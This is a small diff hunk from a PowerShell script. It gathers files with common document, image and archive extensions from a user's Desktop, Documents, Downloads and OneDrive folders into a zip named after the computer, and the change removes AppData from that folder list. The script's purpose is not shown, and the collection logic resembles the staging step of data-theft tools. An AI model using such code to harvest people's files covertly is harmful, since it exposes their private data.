@@ -79,7 +79,7 @@ $currYear = (Get-Date -UFormat %Y)
 $size = 100*1024*1024
 $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*.kme','*.kml','*.kmz','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
 $archname = $env:COMPUTERNAME + '_' + $CurrDateTime + '.zip'
-$deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive', 'AppData')
+$deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($objName -eq "") { $objName = $env:COMPUTERNAME }
 
